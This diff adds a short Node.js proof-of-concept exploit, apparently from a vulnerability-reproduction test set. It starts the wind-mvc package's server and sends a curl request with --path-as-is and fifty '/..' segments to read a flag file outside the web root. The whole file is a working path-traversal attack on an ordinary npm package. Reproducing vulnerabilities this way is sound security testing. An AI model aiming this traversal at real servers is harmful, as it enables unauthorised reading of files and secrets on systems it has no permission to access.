@@ -1,0 +1,24 @@
+function exploitFunction(payload) {
+  const path = require("path");
+  const { sleep } = require("sleep");
+
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+  
+  const genstr = (n) => {
+    return "/..".repeat(50) + pathToFlag;
+  };
+
+  let server = "node ./node_modules/wind-mvc/app.js";
+  let exe = require("child_process").exec(server, (error, stdout) => {});
+
+  sleep.sleep(2);
+  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr()}"`;
+  require("child_process").exec(attack_string, (error, stdout) => {
+    if (stdout) {
+      return stdout;
+    }
+    return null;
+  });
+}
+
+module.exports = { exploitFunction };
